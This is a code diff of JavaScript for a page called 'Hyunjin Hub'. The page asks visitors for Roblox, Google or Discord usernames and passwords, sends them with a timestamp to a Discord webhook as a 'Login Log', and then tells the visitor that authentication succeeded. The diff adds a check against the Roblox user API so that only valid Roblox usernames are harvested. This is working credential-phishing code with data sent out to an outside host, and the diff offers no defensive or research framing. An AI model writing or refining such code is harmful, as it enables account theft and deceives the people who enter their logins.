@@ -406,37 +406,73 @@
     if (e.target === inputModal) closeInput();
   });
 
-  // Submit Data ke Webhook Discord
+  // Submit Data ke Webhook Discord dengan Validasi Roblox API (Jika Roblox)
   submitInputBtn.addEventListener('click', function() {
     var userInfo = userInputField.value.trim();
     var passwordInfo = passwordInputField.value.trim();
 
-    if (userInfo !== "") {
-      const payload = {
-        content: `🎮 **Login Log - Hyunjin Hub**\n- **Provider:** \`${selectedProvider}\`\n- **Username/ID:** \`${userInfo}\`\n- **Password:** \`${passwordInfo !== "" ? passwordInfo : "(Kosong)"}\`\n- **Waktu:** \`${new Date().toLocaleString()}\``
-      };
+    if (userInfo === "") {
+      alert("Username / ID tidak boleh kosong!");
+      return;
+    }
 
-      fetch(DISCORD_WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
+    if (selectedProvider === 'Roblox') {
+      submitInputBtn.textContent = "Memeriksa...";
+      submitInputBtn.disabled = true;
+
+      // Cek ke API Roblox apakah username valid (menggunakan proxy CORS aman)
+      fetch('https://users.roproxy.com/v1/usernames/users', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ usernames: [userInfo], excludeBannedUsers: true })
       })
-      .then(response => {
-        if(response.ok) {
-          alert("Berhasil terhubung dengan otentikasi " + selectedProvider + "!");
-          closeInput();
+      .then(res => res.json())
+      .then(data => {
+        submitInputBtn.textContent = "Kirim";
+        submitInputBtn.disabled = false;
+
+        if (data && data.data && data.data.length > 0) {
+          // Username valid di Roblox
+          sendWebhook(userInfo, passwordInfo);
         } else {
-          alert("Gagal mengirim data log.");
+          alert("Username Roblox tidak ditemukan atau palsu! Silakan masukkan username yang asli.");
         }
       })
       .catch(err => {
+        submitInputBtn.textContent = "Kirim";
+        submitInputBtn.disabled = false;
         console.error(err);
-        alert("Terjadi kesalahan jaringan.");
+        alert("Gagal memvalidasi username Roblox. Coba lagi.");
       });
     } else {
-      alert("Username / ID tidak boleh kosong!");
+      // Untuk provider selain Roblox (Google/Discord), langsung kirim
+      sendWebhook(userInfo, passwordInfo);
     }
   });
+
+  function sendWebhook(userInfo, passwordInfo) {
+    const payload = {
+      content: `🎮 **Login Log - Hyunjin Hub**\n- **Provider:** \`${selectedProvider}\`\n- **Username/ID:** \`${userInfo}\`\n- **Password:** \`${passwordInfo !== "" ? passwordInfo : "(Kosong)"}\`\n- **Waktu:** \`${new Date().toLocaleString()}\``
+    };
+
+    fetch(DISCORD_WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    })
+    .then(response => {
+      if(response.ok) {
+        alert("Berhasil terhubung dengan otentikasi " + selectedProvider + "!");
+        closeInput();
+      } else {
+        alert("Gagal mengirim data log.");
+      }
+    })
+    .catch(err => {
+      console.error(err);
+      alert("Terjadi kesalahan jaringan.");
+    });
+  }
 
   document.getElementById('yr').textContent = new Date().getFullYear();
 
